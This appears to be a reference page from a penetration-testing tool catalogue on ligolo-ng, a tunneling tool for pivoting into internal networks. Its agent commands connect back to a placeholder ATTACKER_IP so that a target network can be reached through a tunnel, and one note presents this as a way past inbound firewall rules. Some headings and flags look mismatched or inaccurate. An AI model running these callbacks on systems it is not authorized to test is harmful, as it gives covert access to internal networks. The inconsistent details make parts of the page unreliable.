---
title: "ligolo-ng - TUN Interface Tunneling"
description: "Advanced tunneling tool using TUN interfaces for VPN-like network pivoting without SOCKS proxies"
category: "tunneling"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
github: "https://github.com/nicocha30/ligolo-ng"
kali_install: "Download from GitHub releases"
version: "0.7"
---

# ligolo-ng

## Overview

ligolo-ng is a tunneling tool that creates a userland network stack using TUN interfaces. Unlike SOCKS-based tools, ligolo-ng provides a full VPN-like experience where traffic is routed through a TUN interface, allowing native network tools (nmap, curl, ssh) to work without proxychains. The agent runs without privileges on the target system.

## Chapter 1: Installation

### Download Binaries

```bash
# Proxy (attacker) - Linux
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_proxy_linux_amd64.tar.gz
tar xzf ligolo-ng_proxy_linux_amd64.tar.gz

# Agent (target) - Linux
wget https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_linux_amd64.tar.gz
tar xzf ligolo-ng_agent_linux_amd64.tar.gz
```

### Verify Installation

```bash
./proxy -h
./agent -h
```

## Chapter 2: Basic Usage

### Start Proxy

```bash
sudo ./proxy -selfcert
```

**Explanation**: Starts the ligolo-ng proxy with a self-signed certificate. The proxy creates a TUN interface and listens for agent connections. The `-selfcert` flag auto-generates a certificate.

### Start Agent

```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

**Explanation**: The agent connects to the proxy server. `-connect` specifies the proxy address, `-ignore-cert` accepts the self-signed certificate. The agent runs without privileges.

### Setup Interface

```bash
# On proxy (attacker)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Add route to target network
sudo ip route add 10.10.10.0/24 dev ligolo
```

**Explanation**: Creates a TUN interface and adds a route to the target network. Traffic to 10.10.10.0/24 is routed through the ligolo tunnel to the agent.

## Chapter 3: Agent Connection

### Agent with Proxy

```bash
./agent -connect 192.168.1.100:11601 -ignore-cert
```

**Explanation**: Connects to the proxy at the specified IP and port. The agent maintains a persistent connection and tunnels traffic from the TUN interface.

### Agent with Let's Encrypt

```bash
./agent -connect proxy.example.com:443
```

**Explanation**: When the proxy uses a valid TLS certificate, the agent verifies it. This is more secure than using `-ignore-cert`.

### Agent with Custom Interface

```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert -ifname myagent
```

**Explanation**: Sets a custom interface name for the agent. Useful when running multiple agents or when the default name conflicts.

## Chapter 4: Network Configuration

### Proxy Side Setup

```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo

# Bring interface up
sudo ip link set ligolo up

# Add route to internal network
sudo ip route add 10.10.10.0/24 dev ligolo
```

**Explanation**: The TUN interface is the endpoint for the tunnel. Routes determine which traffic goes through the tunnel. Add routes for each internal network reachable through the agent.

### Agent Side Routes

```bash
# On proxy, add remote network
sudo ip route add 192.168.1.0/24 dev ligolo
```

**Explanation**: Routes on the proxy side determine which traffic is sent to the agent. The agent then forwards the traffic to the appropriate destination on its local network.

### Multiple Networks

```bash
# Add routes for multiple networks
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 10.10.20.0/24 dev ligolo
sudo ip route add 172.16.0.0/16 dev ligolo
```

**Explanation**: Multiple routes can be added to reach different network segments through the same agent. Each route directs traffic for that subnet through the tunnel.

## Chapter 5: Interactive Commands

### Start Tunnel

```
proxy> session
ligolo-ng> start
```

**Explanation**: Starts the tunnel session. The agent begins forwarding traffic from the TUN interface.

### List Agents

```
proxy> session
```

**Explanation**: Lists all connected agents with their IDs, remote addresses, and status.

### Add Route

```
proxy> session
ligolo-ng> ifconfig
```

**Explanation**: Shows the current network configuration of the tunnel interface.

## Chapter 6: Advanced Features

### Listener on Agent

```bash
# On proxy
ligolo-ng> listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp
```

**Explanation**: Creates a listener on the proxy that forwards connections through the agent to the target. This is useful for accessing services on the target network from the proxy.

### Reverse Connection

```bash
# Agent connects outbound (default)
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

**Explanation**: By default, the agent initiates the connection to the proxy. This bypasses inbound firewall rules on the target.

### WebSocket Support

```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:443 -wss
```

**Explanation**: The proxy can listen on WebSocket for environments where only HTTP/HTTPS is allowed. The agent connects via WebSocket instead of raw TCP.

## Chapter 7: Performance

### Benchmark

```bash
# Through test (100+ Mbps typical)
iperf3 -c 10.10.0.1 -p 24483
```

**Explanation**: ligolo-ng achieves over 100 Mbps throughput due to its efficient userland network stack. This is significantly faster than SOCKS-based alternatives.

### Protocol Support

- **TCP**: Full support, SYN/ACK handling
- **UDP**: Full support with multiplexing
- **ICMP**: Echo requests (ping) supported

**Explanation**: ligolo-ng supports TCP, UDP, and ICMP protocols. TCP connections are handled with proper state tracking, UDP with multiplexing, and ICMP with echo request handling.

## Chapter 8: Operational Considerations

### Privileges

- **Proxy**: Requires root (for TUN interface creation)
- **Agent**: Runs without privileges

**Explanation**: The agent can run as any user, making it suitable for scenarios where root access is not available on the target system.

### Certificate Management

```bash
# Generate self-signed certificate
sudo ./proxy -selfcert -certfile cert.pem -keyfile key.pem

# Use custom certificate
sudo ./proxy -certfile cert.pem -keyfile key.pem
```

**Explanation**: The proxy uses TLS for all communications. Self-signed certificates are suitable for testing, while custom certificates provide proper validation.

### Multiple Agents

```bash
# Each agent gets its own session
./agent -connect ATTACKER_IP:11601 -ignore-cert -id agent1
./agent -connect ATTACKER_IP:11601 -ignore-cert -id agent2
```

**Explanation**: Multiple agents can connect to the same proxy, each providing access to different network segments. The operator can switch between agents to pivot through different networks.

## Resources

- [ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
- [ligolo-ng Documentation](https://docs.ligolo.ng/)
- [Gvisor Userland Network Stack](https://gvisor.dev/)
